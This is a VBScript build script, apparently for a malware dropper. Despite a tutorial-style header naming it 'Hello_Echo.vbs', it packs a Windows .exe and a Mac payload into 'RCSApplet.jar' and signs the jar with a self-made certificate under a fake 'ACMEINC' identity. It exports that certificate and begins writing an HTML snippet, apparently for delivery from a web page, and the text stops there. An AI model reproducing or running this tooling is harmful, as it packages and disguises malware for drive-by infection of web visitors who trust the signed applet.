'  Hello_Echo.vbs
'  Copyright (c) 2008 by Dr. Herong Yang, http://www.herongyang.com/

JarFile = "RCSApplet.jar"
KeyStore = "applet_keystore"
RCSApplet = "RCSApplet.jar"
SignedApplet = "signed_applet.jar"
AppletCertificate = "signed_applet.cer"

Set oArgs = WScript.Arguments
If oArgs.Length < 2 Then 
	WScript.Echo "No arguments provided!"
	WScript.Echo "Usage: makeapplet <payload> <tempdir>"
	WScript.Quit 1
End If

Payload = WScript.Arguments.Item(0)
TmpDir = WScript.Arguments.Item(1)

WScript.Echo "Selected payload          : " & Payload
WScript.Echo "Using temporary directory : " & TmpDir
WScript.Echo

Set objFSO = CreateObject("Scripting.FileSystemObject")
If not objFSO.FolderExists (TmpDir) then
	WScript.Echo "Cannot find temporary directory " & TmpDir
	WScript.Quit 1
End If

PayloadWin = Payload & ".exe"
PayloadMac = Payload

If not objFSO.FileExists(PayloadWin) then
	WScript.Echo "Cannot find Windows payload file " & PayloadWin
	WScript.Quit 1
End If

If not objFSO.FileExists(PayloadMac) then
	WScript.Echo "Cannot find Mac payload file " & PayloadWin
	WScript.Quit 1
End If

WScript.Echo "Adding payload to jar file."
Set WshShell = CreateObject("WScript.Shell")

WScript.Echo "Embedding Windows payload."
Ret = WshShell.Run("zip -u " & JarFile & " " & PayloadWin, 0, true)

WScript.Echo "Embedding Mac payload."
Ret = WshShell.Run("zip -u " & JarFile & " " & PayloadMac, 0, true)

WScript.Echo "Creating certificate."
Ret = WshShell.Run("keytool -genkey -alias signapplet -dname ""CN=ACMEINC, O=Default, C=US"" -validity 18250 -keystore applet_keystore -keypass key_password -storepass store_password", 0, true)
If not objFSO.FileExists("applet_keystore") then
	WScript.Echo "Cannot find keystore file!"
	WScript.Quit 1
End If

WScript.Echo "Signing applet."
Ret = WshShell.Run("jarsigner -keystore applet_keystore -storepass store_password -keypass key_password -signedjar signed_applet.jar " & JarFile & " signapplet", 0, true)
If not objFSO.FileExists("signed_applet.jar") then
	WScript.Echo "Cannot find signed_applet.jar!"
	WScript.Quit 1
End If

WScript.Echo "Exporting certificate."
Ret = WshShell.Run("keytool -export -keystore applet_keystore -storepass store_password -alias signapplet -file signed_applet.cer", 0, true)
If not objFSO.FileExists("signed_applet.cer") then
	WScript.Echo "Cannot find signed_applet.cer!"
	WScript.Quit 1
End If

Set objFile = objFSO.CreateTextFile("snippet.html")


